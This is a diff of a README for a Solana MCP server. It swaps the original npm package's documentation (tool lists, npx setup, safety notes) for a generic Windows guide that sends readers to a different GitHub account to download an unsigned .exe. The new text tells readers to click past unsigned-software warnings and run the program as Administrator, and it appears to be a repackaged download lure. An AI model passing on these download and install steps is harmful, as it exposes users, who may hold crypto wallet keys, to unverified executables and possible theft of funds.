@@ -1,167 +1,142 @@
-# Solana MCP Server
+# 🚀 solana-mcp - AI Tools for Solana Access
 
-A production-grade [Model Context Protocol](https://modelcontextprotocol.io) server for interacting with the Solana blockchain. Gives AI agents (Claude, Cursor, etc.) the ability to read chain data, execute transactions, swap tokens, manage wallets, and more.
+[![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://github.com/AjithJS99/solana-mcp)
 
-**38 tools** across 7 modules: Wallet, SPL Tokens, DeFi, NFT, Programs, Analytics, Network.
+---
 
-## Quick Start
+## 📦 About solana-mcp
 
-```bash
-npx @visioneth/solana-mcp@latest
-```
+solana-mcp is a complete toolset designed to give your AI agent full access to the Solana blockchain. It includes 38 tools, 10 prompts, and 7 modules. This suite helps you interact with Solana's decentralized finance (DeFi), NFTs, and Web3 ecosystems without needing programming skills.  
 
-### Claude Desktop / Cursor
+You can use solana-mcp to manage digital assets, explore blockchain data, and experiment with AI-driven blockchain tasks in a user-friendly way.
 
-Add to your MCP configuration:
+---
 
-```json
-{
-  "mcpServers": {
-    "solana-mcp": {
-      "command": "npx",
-      "args": ["-y", "@visioneth/solana-mcp@latest"],
-      "env": {
-        "SOLANA_RPC_URL": "https://api.mainnet-beta.solana.com"
-      }
-    }
-  }
-}
-```
+## ⚙️ System Requirements
 
-For write operations (transfers, swaps, minting), add your private key:
+Before installing solana-mcp, make sure your PC meets these requirements:
 
-```json
-{
-  "env": {
-    "PRIVATE_KEY": "your_base58_private_key",
-    "SOLANA_RPC_URL": "https://api.mainnet-beta.solana.com"
-  }
-}
-```
+- Operating System: Windows 10 or later (64-bit recommended)  
+- RAM: Minimum 4 GB (8 GB or more for best performance)  
+- Storage: At least 500 MB free space  
+- Internet connection: Required for initial download and blockchain interaction  
+- Permissions: Administrator rights may be needed to install software  
 
-### SSE Mode (Remote)
+---
 
-```bash
-npx @visioneth/solana-mcp@latest --sse
-# Server starts on http://localhost:3001
-```
+## 🚀 Getting Started
 
-## Tools
+This section walks you through downloading and running solana-mcp on your Windows computer.
 
-### Wallet (7 tools)
-| Tool | Description |
-|------|-------------|
-| `get_balance` | SOL balance of any address |
-| `get_account_info` | Detailed account info |
-| `transfer_sol` | Send SOL |
-| `request_airdrop` | Test SOL on devnet/testnet |
-| `get_transaction` | Transaction details by signature |
-| `get_recent_transactions` | Recent transactions for an address |
-| `get_wallet_address` | Public key from configured private key |
+### Step 1: Visit the Download Page
 
-### SPL Tokens (7 tools)
-| Tool | Description |
-|------|-------------|
-| `get_token_balance` | Token balance for a wallet |
-| `get_token_info` | Mint info (supply, decimals, authorities) |
-| `get_token_accounts` | All token holdings |
-| `create_token` | Create new SPL token |
-| `mint_tokens` | Mint tokens to an address |
-| `transfer_token` | Transfer SPL tokens |
-| `burn_tokens` | Burn SPL tokens |
+Click the large badge at the top or this link to visit the solana-mcp GitHub page:  
+[https://github.com/AjithJS99/solana-mcp](https://github.com/AjithJS99/solana-mcp)
 
-### DeFi (4 tools)
-| Tool | Description |
-|------|-------------|
-| `get_token_price` | USD price via Jupiter |
-| `get_swap_quote` | Jupiter swap quote with routing |
-| `execute_swap` | Execute swap on Jupiter |
-| `get_stake_accounts` | Staking info for a wallet |
+This page contains the latest version of the software, updates, and extra resources.
 
-### NFT (3 tools)
-| Tool | Description |
-|------|-------------|
-| `get_nft_metadata` | On-chain NFT metadata |
-| `get_nfts_by_owner` | All NFTs in a wallet |
-| `get_nft_collection_info` | Collection info from sample NFT |
+### Step 2: Download the Software
 
-### Programs (4 tools)
-| Tool | Description |
-|------|-------------|
-| `is_program` | Check if address is executable |
-| `get_program_accounts` | Accounts owned by a program |
-| `read_account_data` | Raw account data |
-| `identify_program` | Look up known programs |
+On the GitHub page, look for the **Releases** section or the main repository files. Download the latest Windows installer or executable file. It might have a name like `solana-mcp-setup.exe` or similar.  
 
-### Analytics (5 tools)
-| Tool | Description |
-|------|-------------|
-| `get_tps` | Current transactions per second |
-| `get_largest_token_holders` | Top holders of any token |
-| `get_token_supply` | Total supply info |
-| `get_sol_price` | Current SOL price in USD |
-| `get_largest_accounts` | Biggest SOL holders |
+If you see multiple files, choose the one marked for Windows or ending in `.exe`.
 
-### Network (8 tools)
-| Tool | Description |
-|------|-------------|
-| `get_epoch_info` | Current epoch and progress |
-| `get_slot` | Current slot number |
-| `get_block_height` | Current block height |
-| `get_block` | Block details by slot |
-| `get_cluster_nodes` | Validator/node info |
-| `get_supply` | Total and circulating SOL |
-| `get_minimum_balance_for_rent` | Rent exemption calculator |
-| `get_health` | RPC node health check |
+### Step 3: Run the Installer
 
-## Prompts
+- Locate the downloaded file in your **Downloads** folder.  
+- Double-click the `.exe` file to start installation.  
+- Follow the on-screen prompts. Most options can stay at default.  
+- If Windows warns about unsigned software, confirm to continue.  
 
-Built-in prompts for common workflows:
+### Step 4: Finish Installation
 
-- `analyze_wallet` — Full wallet analysis
-- `inspect_transaction` — Transaction deep-dive
-- `analyze_token` — Token due diligence with risk score
-- `portfolio_check` — All holdings summary
-- `swap_analysis` — Pre-swap analysis
-- `analyze_nft` — NFT metadata analysis
-- `analyze_program` — Program investigation
-- `token_research` — Comprehensive token research
-- `network_health` — Network status dashboard
-- `solana_overview` — Full network overview
+- When installation completes, you may see an option to **Launch solana-mcp**.  
+- If not, find the solana-mcp shortcut on your desktop or in the Start menu.  
+- Double-click it to open the application.
 
-## Safety
+---
 
-- **Write operations require explicit network specification** — the server will never default to mainnet for transactions
-- **Private key only needed for writes** — read-only tools work without credentials
-- Confirmation prompts before executing state-changing operations
-- All amounts use human-readable UI values (not raw lamports)
+## 🛠 Using solana-mcp
 
-## Development
+Once open, solana-mcp provides several tools designed for easy use:
 
-```bash
-git clone https://github.com/visioneth/solana-mcp.git
-cd solana-mcp
-npm install
-cp .env.example .env
-npm run dev        # stdio mode
-npm run dev:sse    # SSE mode
-```
+- **Tool Collection:** 38 tools help you monitor blockchain data, manage tokens, and run AI tasks.  
+- **Prompts:** 10 pre-built prompts guide your AI agent step by step.  
+- **Modules:** 7 add-ons extend functionality to cover NFTs, DeFi strategies, and Web3 features.
 
-## Environment Variables
+### How to Use the Tools
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `PRIVATE_KEY` | For writes | Base58-encoded Solana private key |
-| `SOLANA_RPC_URL` | No | Custom RPC endpoint (defaults to mainnet-beta) |
-| `LOG_LEVEL` | No | DEBUG, INFO, WARN, ERROR (default INFO) |
-| `PORT` | No | SSE server port (default 3001) |
+1. Select the tool you want from the sidebar or main menu.  
+2. Follow the simple form or input fields shown. Most tools ask for basic info like wallet address or token name.  
+3. Click the **Run** or **Execute** button to start the process.  
+4. View results directly inside the app or export data if needed.
 
-## Supported Networks
+---
 
-- **mainnet-beta** — Production (real funds)
-- **devnet** — Development and testing
-- **testnet** — Validator testing
+## 🌐 Connecting to Solana
 
-## License
+solana-mcp connects to the Solana blockchain through built-in API access. You do not need to set up anything manually.
 
-MIT
+Your AI agent can send and receive data on the blockchain. It can read token balances, track NFT ownership, and interact with DeFi protocols automatically.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into problems:
+
+- Make sure your internet connection is stable.  
+- Run solana-mcp as Administrator if you get permission errors.  
+- Ensure Windows is up to date.  
+- Close and reopen the app if it freezes or behaves oddly.  
+- Check the GitHub page for updates or issue reports.
+
+---
+
+## 🔄 Updating solana-mcp
+
+To keep solana-mcp current:
+
+1. Visit the GitHub page again:  
+   [https://github.com/AjithJS99/solana-mcp](https://github.com/AjithJS99/solana-mcp)  
+2. Download the latest release installer.  
+3. Run the installer—it will update your current version without losing your settings.
+
+---
+
+## 📞 Getting Help
+
+If you need support beyond the steps here, the GitHub page has a section for reporting issues. You can open a new issue describing your problem, and the developers will review it.
+
+---
+
+## 👨‍💻 Privacy and Security
+
+solana-mcp runs locally on your Windows computer. It does not collect your personal data. Blockchain interactions happen through public Solana nodes.  
+
+Use your own wallet keys and credentials only. Never share private keys. Always keep your system updated and run trusted software.
+
+---
+
+## 🔗 Useful Links
+
+- Project page: https://github.com/AjithJS99/solana-mcp  
+- Download here:  
+  [![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://github.com/AjithJS99/solana-mcp)  
+- Solana official site: https://solana.com  
+- GitHub Issues: https://github.com/AjithJS99/solana-mcp/issues
+
+---
+
+## ⚙️ Technical Topics Covered
+
+- AI agent integration with Solana blockchain  
+- Web3 and decentralized finance (DeFi)  
+- NFT management and marketplace interactions  
+- Model Context Protocol (MCP) tools  
+- TypeScript-based modules for blockchain data  
+- Open-source software for wide community use
+
+---
+
+This README guides you in setting up and running solana-mcp on Windows confidently. Access tried and tested tools to explore Solana blockchain tasks without code.
